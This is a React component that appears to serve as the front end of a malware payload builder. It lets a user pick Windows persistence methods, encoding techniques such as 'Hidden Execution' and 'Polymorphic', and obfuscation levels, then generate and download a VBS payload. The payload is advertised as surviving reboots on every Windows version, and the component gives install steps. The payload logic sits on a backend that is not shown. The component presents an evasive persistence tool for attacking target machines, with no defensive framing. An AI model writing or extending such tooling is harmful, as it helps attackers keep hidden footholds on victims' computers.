import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { LockIcon, CheckIcon, CopyIcon, DownloadIcon, InfoIcon, LoaderIcon } from './Icons';
import { API_BASE } from '../config';

export default function PersistencePayload({ uploadedFile, loading, onGenerate }) {
  const [methods, setMethods] = useState({});
  const [selectedMethod, setSelectedMethod] = useState('multi');
  const [technique, setTechnique] = useState('base64');
  const [obfuscation, setObfuscation] = useState('high');
  const [payload, setPayload] = useState(null);
  const [generating, setGenerating] = useState(false);
  const [statusMessage, setStatusMessage] = useState(null);
  const [copySuccess, setCopySuccess] = useState(false);

  const showStatus = (message, type = 'info') => {
    setStatusMessage({ message, type });
    setTimeout(() => setStatusMessage(null), 4000);
  };

  useEffect(() => {
    fetchMethods();
  }, []);

  const fetchMethods = async () => {
    try {
      const response = await axios.get(`${API_BASE}/persistence-methods`);
      setMethods(response.data.methods);
    } catch (err) {
      console.error('Failed to fetch persistence methods', err);
    }
  };

  const handleGenerate = async () => {
    if (!uploadedFile) {
      showStatus('Please upload a file first.', 'error');
      return;
    }

    setGenerating(true);
    setStatusMessage(null);

    try {
      const response = await axios.post(`${API_BASE}/generate-persistent`, {
        file_id: uploadedFile.id,
        persistence_method: selectedMethod,
        technique: technique,
        obfuscation: obfuscation,
      });

      setPayload({
        id: response.data.output_id,
        content: response.data.payload,
        size: response.data.size,
        method: response.data.persistence_method,
        methodName: response.data.method_name,
        windowsVersions: response.data.windows_versions,
        survivalRate: response.data.survival_rate,
        advantages: response.data.advantages,
      });

      onGenerate?.(response.data);
    } catch (err) {
      showStatus(err.response?.data?.error || 'Generation failed.', 'error');
    } finally {
      setGenerating(false);
    }
  };

  const handleDownload = async () => {
    if (!payload?.id) return;

    try {
      const response = await axios.get(`${API_BASE}/download/${payload.id}`, {
        responseType: 'blob',
      });

      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', `persistent_${payload.id}.vbs`);
      document.body.appendChild(link);
      link.click();
      link.parentElement.removeChild(link);
      window.URL.revokeObjectURL(url);
    } catch (err) {
      console.error('Download failed:', err);
      showStatus('Download failed. Please try again.', 'error');
    }
  };

  const handleCopy = () => {
    if (payload?.content) {
      navigator.clipboard.writeText(payload.content);
      setCopySuccess(true);
      setTimeout(() => setCopySuccess(false), 2000);
    }
  };

  return (
    <div>
      <h2><LockIcon /> Persistent Payload</h2>
      <p style={{ color: 'var(--text-muted)', fontSize: '0.8125rem', margin: '0 0 1rem 0' }}>
        Survives reboots on all Windows versions (XP through 11)
      </p>

      {statusMessage && (
        <div className={`status-message ${statusMessage.type}`}>
          {statusMessage.message}
        </div>
      )}

      <div className="form-group">
        <label style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span>Persistence Method</span>
          {selectedMethod === 'multi' && <span className="tag success">99%+ survival</span>}
        </label>
        <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)', margin: '0.375rem 0 0.5rem' }}>
          Choose method based on your target Windows version and requirements
        </p>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem' }}>
          {Object.entries(methods).map(([key, desc]) => (
            <div
              key={key}
              className={`fingerprint-card ${selectedMethod === key ? 'selected' : ''}`}
              onClick={() => setSelectedMethod(key)}
            >
              <div className="fingerprint-name">
                {key.toUpperCase()}
                {key === 'multi' && <span className="tag success" style={{ marginLeft: '0.375rem', fontSize: '0.5625rem' }}>Best</span>}
              </div>
              <div className="fingerprint-desc">
                {typeof desc === 'string' ? desc.substring(0, 60) : desc}
                {typeof desc === 'string' && desc.length > 60 ? '...' : ''}
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="form-group">
        <label>Encoding Technique</label>
        <select value={technique} onChange={(e) => setTechnique(e.target.value)}>
          <option value="base64">Base64</option>
          <option value="hex">Hex</option>
          <option value="array">Array</option>
          <option value="wmi">WMI</option>
          <option value="registry">Registry</option>
          <option value="environment">Environment Variables</option>
          <option value="com">COM Objects</option>
          <option value="obfuscated_calls">Obfuscated Calls</option>
          <option value="filewriter">FileWriter</option>
          <option value="multi_encoding">Multi-Encoding</option>
          <option value="hidden_execution">Hidden Execution</option>
          <option value="polymorphic">Polymorphic</option>
          <option value="multi">Multi (Combined)</option>
          <option value="direct">Direct</option>
        </select>
      </div>

      <div className="form-group">
        <label>Obfuscation Level</label>
        <div className="level-buttons">
          {['low', 'medium', 'high'].map((level) => (
            <button
              key={level}
              className={`level-btn ${obfuscation === level ? 'active' : ''}`}
              onClick={() => setObfuscation(level)}
            >
              {level}
            </button>
          ))}
        </div>
      </div>

      <button
        className="btn-generate"
        onClick={handleGenerate}
        disabled={!uploadedFile || generating}
      >
        {generating ? <><LoaderIcon size={14} /> Generating...</> : <><LockIcon size={14} /> Generate Persistent Payload</>}
      </button>

      <div className="info-box neutral" style={{ marginTop: '0.75rem' }}>
        <p style={{ margin: 0, fontSize: '0.75rem', color: 'var(--text-muted)' }}>
          <InfoIcon size={12} style={{ verticalAlign: 'middle', marginRight: '0.25rem' }} />
          Persistent payload survives reboots, system restart, and user logoff. Works on all Windows versions.
        </p>
      </div>

      {payload && (
        <div style={{ marginTop: '1rem' }}>
          <div className="info-box success" style={{ marginBottom: '0.75rem' }}>
            <p style={{ margin: '0 0 0.5rem 0', fontWeight: 600, fontSize: '0.8125rem' }}>
              <CheckIcon size={14} style={{ verticalAlign: 'middle', marginRight: '0.25rem' }} />
              Persistent Payload Generated
            </p>
          </div>

          <div className="stat-grid">
            <div className="stat-card">
              <div className="stat-label">Method</div>
              <div className="stat-value" style={{ fontSize: '0.75rem' }}>{payload.methodName}</div>
            </div>
            <div className="stat-card">
              <div className="stat-label">Survival Rate</div>
              <div className="stat-value" style={{ fontSize: '0.75rem', color: 'var(--success)' }}>{payload.survivalRate}</div>
            </div>
            <div className="stat-card">
              <div className="stat-label">Payload Size</div>
              <div className="stat-value" style={{ fontSize: '0.75rem' }}>{(payload.size / 1024).toFixed(2)} KB</div>
            </div>
          </div>

          <div style={{ marginBottom: '0.75rem', fontSize: '0.75rem', color: 'var(--text-muted)' }}>
            <strong style={{ color: 'var(--text-secondary)' }}>Windows:</strong> {payload.windowsVersions}
          </div>

          {payload.advantages && payload.advantages.length > 0 && (
            <ul style={{ margin: '0 0 0.75rem 0', paddingLeft: '1.25rem', color: 'var(--text-muted)', fontSize: '0.75rem', lineHeight: '1.6' }}>
              {payload.advantages.map((adv, idx) => <li key={idx}>{adv}</li>)}
            </ul>
          )}

          <div style={{ marginBottom: '0.75rem', padding: '0.75rem', background: 'var(--bg-primary)', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-default)' }}>
            <div style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)', marginBottom: '0.375rem' }}>Installation</div>
            <div style={{ color: 'var(--text-muted)', fontSize: '0.75rem', lineHeight: '1.6' }}>
              1. Download the payload file<br />
              2. Run with: <code style={{ color: 'var(--accent)', fontFamily: "'JetBrains Mono', monospace", fontSize: '0.6875rem' }}>cscript payload.vbs</code> or double-click<br />
              3. Installation persists through reboots
            </div>
          </div>

          <div className="output-controls">
            <button className="btn-primary" onClick={handleDownload}>
              <DownloadIcon size={14} /> Download
            </button>
            <button className="btn-secondary" onClick={handleCopy}>
              {copySuccess ? <><CheckIcon size={14} /> Copied</> : <><CopyIcon size={14} /> Copy Code</>}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
